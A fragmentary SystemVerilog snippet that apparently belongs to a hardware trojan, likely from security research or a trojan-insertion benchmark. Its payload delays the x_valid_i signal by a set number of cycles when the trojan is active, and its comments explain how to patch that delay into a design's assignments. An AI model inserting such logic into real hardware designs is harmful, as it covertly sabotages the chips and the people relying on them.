 ...
 * Payload: Delay x_valid_i by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && x_valid_i) begin
...
// ============================================================
// Performance Degradation: Delay x_valid_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF x_valid_i is a ready/valid signal:
//   Find: assign x_valid_i = ready_condition;
//   Replace: assign x_valid_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF x_valid_i is in always_ff:
//   Find: x_valid_i <= ready_value;
//   Replace: x_valid_i <= (delay_counter == 0) ? ready_value : 1'b0;